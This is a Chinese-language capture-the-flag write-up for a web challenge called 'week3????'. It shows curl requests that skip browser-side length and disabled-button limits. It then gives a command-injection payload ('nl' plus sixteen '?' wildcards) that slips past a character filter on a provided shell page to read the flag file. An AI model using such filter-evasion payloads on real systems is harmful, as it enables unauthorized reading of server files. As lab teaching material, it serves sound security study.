# week3????

## 题目简述

题目分为两步：先绕过前端对字符串长度和提交按钮的限制，取得隐藏 shell 路径；再利用命令过滤器遗漏的字符与 Linux 通配符读取 flag 文件。

Windows 文件名不适合直接使用四个问号，因此 Markdown 文件名写作 `week3四问号WP.md`，标题仍保留题目原名 `week3????`。

## 解题过程

入口页面明示需要提交 `yulige`，但输入框设置了 `maxlength="4"`，提交按钮也带有 `disabled`。这些都是浏览器端属性，服务端 `maxlenth.php` 实际只做严格字符串比较：

```php
$ip = $_POST['ip'];
if ($ip === "yulige") {
    echo "flag不在这，I prepared a shell for you : sh3ll.php";
}
```

因此无需修改页面 DOM，直接向接口发送请求即可：

```text
curl -s -X POST -d "ip=yulige" "http://TARGET/maxlenth.php"
```

响应给出第二阶段路径 `sh3ll.php`。其第一层正则为：

```php
preg_match("/[A-Za-ko-z0-9]+/", $cmd)
```

字符类会阻止大写 `A-Z`、小写 `a-k` 与 `o-z`，以及数字 `0-9`，唯独留下小写 `l`、`m`、`n`。后续黑名单又封锁了斜杠、下划线、连字符、引号等字符，但没有封锁空格、点号和问号。因此仍可使用只由允许字母组成的命令 `nl`，并用 `?` 匹配未知文件名中的任意单个字符。

源码注释表明目标文件为 `fl4g_is_here.php`，其文件名恰好有 16 个字符。提交 `nl`、一个空格和 16 个问号：

```text
curl -s -X POST \
  --data-urlencode "cmd=nl ????????????????" \
  "http://TARGET/sh3ll.php"
```

Shell 展开通配符后实际执行的是 `nl fl4g_is_here.php`。`nl` 会读取文件并为输出加行号。若响应中的 PHP/HTML 标签被浏览器解释而未直接显示，应查看原始响应或页面源代码；这只是展示问题，不是额外漏洞步骤。

## 方法总结

第一阶段应区分客户端约束和服务端校验，直接构造请求即可绕过 `maxlength` 与 `disabled`。第二阶段则要精确计算允许字符集合：漏网的 `n`、`l` 组成读取命令，未过滤的 `?` 作为单字符 glob，从而在不能输入文件名字母、数字和下划线时仍能定位目标文件。
